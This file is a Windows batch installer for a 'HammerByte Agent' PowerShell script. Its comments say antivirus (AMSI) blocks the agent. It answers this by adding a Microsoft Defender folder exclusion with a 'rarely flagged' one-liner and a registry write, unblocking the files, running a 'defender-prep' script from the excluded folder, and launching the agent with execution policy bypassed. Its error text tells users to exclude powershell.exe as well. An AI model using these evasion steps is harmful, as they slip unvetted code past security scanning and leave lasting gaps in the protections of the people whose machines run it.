@echo off
setlocal
title HammerByte Agent installer

net session >nul 2>&1
if errorlevel 1 (
    echo.
    echo  Please right-click install-agent.cmd and choose "Run as administrator".
    echo.
    pause
    exit /b 1
)

set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if exist "%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe" set "PS=%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe"

if not exist "%~dp0agent.ps1" (
    echo  agent.ps1 was not found next to this file. Extract the whole zip first.
    pause
    exit /b 1
)

set "HBROOT=%ProgramData%\HammerByte"
set "HBAGENT=%HBROOT%\agent\agent.ps1"
set "HBPREP=%HBROOT%\agent\hb-defender-prep.ps1"

echo.
echo  Preparing %HBROOT% ...
mkdir "%HBROOT%\agent" 2>nul
mkdir "%HBROOT%\logs" 2>nul
mkdir "%HBROOT%\run" 2>nul
mkdir "%HBROOT%\services" 2>nul
mkdir "%HBROOT%\cache" 2>nul

rem AMSI blocks agent.ps1 at parse time. Seed a folder exclusion with a one-liner
rem first (rarely flagged), copy files into that folder, then run the platform-aware
rem prep script FROM the excluded path before loading agent.ps1.
echo  Seeding Microsoft Defender folder exclusion ...
"%PS%" -NoProfile -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath $env:ProgramData\HammerByte -ErrorAction Stop; Write-Output 'Defender exclusion OK' } catch { Write-Output ('Add-MpPreference: ' + $_.Exception.Message) }"
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%HBROOT%" /t REG_DWORD /d 0 /f >nul 2>&1

copy /Y "%~dp0agent.ps1" "%HBAGENT%" >nul
if errorlevel 1 (
    echo  Could not copy agent.ps1 to %HBAGENT%
    pause
    exit /b 1
)

if exist "%~dp0hb-defender-prep.ps1" (
    copy /Y "%~dp0hb-defender-prep.ps1" "%HBPREP%" >nul
) else (
    echo  hb-defender-prep.ps1 missing next to this installer - continuing with folder exclusion only.
)

"%PS%" -NoProfile -ExecutionPolicy Bypass -Command "try { Unblock-File -LiteralPath (Join-Path $env:ProgramData 'HammerByte\agent\agent.ps1') -ErrorAction SilentlyContinue; Unblock-File -LiteralPath (Join-Path $env:ProgramData 'HammerByte\agent\hb-defender-prep.ps1') -ErrorAction SilentlyContinue } catch {}"

if exist "%HBPREP%" (
    echo  Running Defender prep from excluded folder ...
    "%PS%" -NoProfile -ExecutionPolicy Bypass -File "%HBPREP%"
)

echo  Installing from %HBAGENT% ...
"%PS%" -NoProfile -ExecutionPolicy Bypass -File "%HBAGENT%" -Install
set "RC=%ERRORLEVEL%"
echo.
if "%RC%"=="0" (
    echo  Done.
) else (
    echo  Install failed with exit code %RC%.
    echo  If antivirus still blocked the script on Windows Server:
    echo    1. Windows Security / Defender -^> Exclusions
    echo    2. Add folder: %HBROOT%
    echo    3. Add process: %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe
    echo    4. Re-run this installer as Administrator
    echo  Logs: %HBROOT%\logs
)
pause
exit /b %RC%
